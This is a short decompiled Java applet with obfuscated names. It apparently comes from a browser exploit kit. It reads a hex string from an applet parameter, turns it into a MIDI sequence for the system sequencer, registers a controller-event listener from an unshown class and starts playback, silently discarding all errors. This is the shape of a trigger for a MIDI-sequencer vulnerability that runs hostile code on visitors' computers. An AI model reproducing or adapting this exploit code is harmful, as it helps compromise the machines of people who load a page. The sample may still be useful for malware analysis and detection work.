import javax.sound.midi.ControllerEventListener;
import java.io.InputStream;
import javax.sound.midi.MidiSystem;
import java.io.ByteArrayInputStream;
import javax.sound.midi.Sequencer;
import java.io.ByteArrayOutputStream;
import javax.sound.midi.MidiDevice;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class wot extends Applet
{
    static String mun;
    static byte[] git;
    static MidiDevice.Info[] gae;
    static MidiDevice yuk;
    static ByteArrayOutputStream ods;
    static Sequencer tot;
    static ByteArrayInputStream zed;
    static String ora;
    static cop has;
    
    @Override
    public void init() {
        try {
            wot.mun = this.getParameter("hao");
            if (wot.mun.length() > 0) {
                this.hyp(wot.mun);
            }
        }
        catch (Exception ex) {}
    }
    
    public void hyp(final String s) {
        try {
            wot.gae = MidiSystem.getMidiDeviceInfo();
            wot.yuk = MidiSystem.getMidiDevice(wot.gae[0]);
            wot.tot = null;
            (wot.tot = (Sequencer)wot.yuk).open();
            wot.ods = new ByteArrayOutputStream();
            wot.git = new byte[s.length() / 2];
            for (int i = 0; i < s.length(); i += 2) {
                wot.git[i / 2] = (byte)(Object)Integer.decode("0x" + s.substring(i, i + 2));
            }
            wot.ods.write(wot.git, 0, s.length() / 2);
            wot.zed = new ByteArrayInputStream(wot.ods.toByteArray());
            wot.tot.setSequence(wot.zed);
            wot.has = new cop();
            wot.tot.addControllerEventListener(wot.has, new int[] { 0 });
            wot.tot.start();
        }
        catch (Exception ex) {}
    }
}
